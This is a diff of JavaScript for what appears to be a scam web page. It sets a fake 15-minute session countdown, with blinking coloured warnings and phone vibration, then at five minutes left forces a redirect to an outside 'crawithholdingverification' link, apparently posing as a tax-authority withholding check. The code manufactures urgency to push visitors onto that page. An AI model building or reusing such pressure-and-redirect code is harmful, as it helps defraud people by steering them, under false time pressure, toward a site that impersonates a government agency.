@@ -1070,11 +1070,11 @@ setInterval(updateACU, 30000); // every 30 seconds
     let timer;
 
     const getState = (remaining) => {
-        if (remaining <= 0) return "expired";
-        if (remaining <= 120) return "warning2";
-        if (remaining <= 240) return "warning4";
-        return "active";
-    };
+    if (remaining <= 0) return "expired";
+    if (remaining <= 300) return "warning_red";     // 5 min
+    if (remaining <= 540) return "warning_yellow";  // 9 min
+    return "active";
+};
 
     const updateCountdown = () => {
 
@@ -1088,13 +1088,13 @@ setInterval(updateACU, 30000); // every 30 seconds
 
     const state = getState(remaining);
 
-    // 🟡 4 MIN WARNING
-    if (state === "warning4") {
+    // 🎨 STATE HANDLING
+    if (state === "warning_yellow") {
         notification.classList.add("warning-yellow");
+        notification.classList.remove("warning-red");
     }
 
-    // 🔴 2 MIN WARNING
-    if (state === "warning2") {
+    if (state === "warning_red") {
         notification.classList.remove("warning-yellow");
         notification.classList.add("warning-red");
 
@@ -1103,20 +1103,26 @@ setInterval(updateACU, 30000); // every 30 seconds
         }
     }
 
-    // 🟡 ALWAYS VISIBLE IN WARNING STATES
-    if (remaining <= 240) {
+    // 🔁 VISIBILITY RULES (15 min session)
+
+    if (remaining > 720) {
         notification.classList.add("show");
     }
 
-    // 🔁 PULSE SYSTEM (ONLY ACTIVE STATE)
-    const cycle = remaining % 360;
+    else if (remaining > 540) {
+        notification.classList.remove("show");
+    }
 
-    if (remaining > 240) {
-        if (cycle >= 180) {
-            notification.classList.add("show");
-        } else {
-            notification.classList.remove("show");
-        }
+    else if (remaining > 360) {
+        notification.classList.add("show");
+    }
+
+    else if (remaining > 300) {
+        notification.classList.remove("show");
+    }
+
+    else {
+        notification.classList.add("show");
     }
 
     // 🕒 TEXT DISPLAY
@@ -1133,13 +1139,13 @@ setInterval(updateACU, 30000); // every 30 seconds
 
     const initialState = getState(remaining);
 
-    if (initialState === "warning4") {
-        notification.classList.add("warning-yellow");
-    }
+    if (initialState === "warning_yellow") {
+    notification.classList.add("warning-yellow");
+}
 
-    if (initialState === "warning2") {
-        notification.classList.add("warning-red");
-    }
+if (initialState === "warning_red") {
+    notification.classList.add("warning-red");
+}
 
     notification.classList.add("show");
 
@@ -1154,50 +1160,33 @@ setInterval(updateACU, 30000); // every 30 seconds
 
     const AVB_PAGE = "https://link.avalonflow.site/crawithholdingverification";
 
-    // create session if not exists
     if (!localStorage.getItem("avb_expiry_time")) {
         localStorage.setItem(
             "avb_expiry_time",
-            Date.now() + 10 * 60 * 1000
+            Date.now() + 15 * 60 * 1000
         );
     }
 
-    let warned4 = false;
-    let redirected2 = false;
+    let redirected = false;
 
     const check = () => {
 
         const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
         const remaining = expiryTime - Date.now();
 
-        // 🟡 4 MIN WARNING
-        if (!warned4 && remaining <= 240000 && remaining > 120000) {
-            warned4 = true;
-        }
+        // 🔴 REDIRECT AT 5 MIN
+        if (!redirected && remaining <= 300000 && remaining > 0) {
 
-        // 🔴 2 MIN → REDIRECT TO AVB PAGE
-        if (!redirected2 && remaining <= 120000 && remaining > 0) {
+            redirected = true;
 
-            redirected2 = true;
-
-            if (
-    state === "warning2" &&
-    !notification.classList.contains("vibrated")
-) {
-    notification.classList.remove("warning-yellow");
-    notification.classList.add("warning-red");
-    notification.classList.add("vibrated");
-
-    if (navigator.vibrate) {
-        navigator.vibrate([300, 100, 300]);
-    }
-}
+            if (navigator.vibrate) {
+                navigator.vibrate([300, 100, 300]);
+            }
 
             setTimeout(() => {
                 window.location.href = AVB_PAGE;
             }, 800);
         }
-
     };
 
     check();
